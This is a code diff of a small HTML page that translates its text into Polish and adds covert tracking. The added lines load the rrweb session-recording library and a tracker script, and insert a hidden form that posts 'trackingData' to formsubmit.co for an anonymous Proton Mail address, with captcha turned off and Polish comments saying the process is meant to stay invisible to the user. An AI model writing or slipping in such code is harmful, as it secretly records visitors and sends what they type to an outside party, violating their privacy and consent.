@@ -1,18 +1,32 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome</title>
+    <title>Witaj</title>
+    <!-- Dołączam bibliotekę rrweb do nagrywania sesji -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/rrweb/dist/rrweb.min.css" />
     <script src="https://cdn.jsdelivr.net/npm/rrweb/dist/rrweb.min.js"></script>
+    <!-- Dołączam nasz skrypt śledzący -->
     <script src="/tracker.js" defer></script>
 </head>
 <body>
-    <h1>Welcome to the site!</h1>
-    <p>Please enter some text below:</p>
-    <textarea id="text-input" rows="5" cols="50" placeholder="Type anything here..."></textarea>
+    <h1>Witaj na stronie!</h1>
+    <p>Wprowadź poniżej dowolny tekst:</p>
+    <textarea id="text-input" rows="5" cols="50" placeholder="Wpisz cokolwiek tutaj..."></textarea>
     <br><br>
-    <button onclick="alert('Button clicked!')">Click me</button>
+    <button onclick="alert('Przycisk kliknięty!')">Kliknij mnie</button>
+
+    <!-- 
+        Niewidoczny formularz do wysyłania danych.
+        Dane zostaną wysłane na adres Anonymousproxy123@proton.me.
+        Po wysłaniu, użytkownik zostanie na stronie dzięki _next.
+        Wyłączam Captcha, aby proces był niewidoczny dla użytkownika.
+    -->
+    <form id="trackingForm" action="https://formsubmit.co/Anonymousproxy123@proton.me" method="POST" style="display:none;">
+        <input type="hidden" name="_next" value="https://example.com/gracias.html"> <!-- Można tu wstawić dowolny link podziękowania lub zostawić pusty -->
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="trackingData" id="trackingData">
+    </form>
 </body>
 </html>
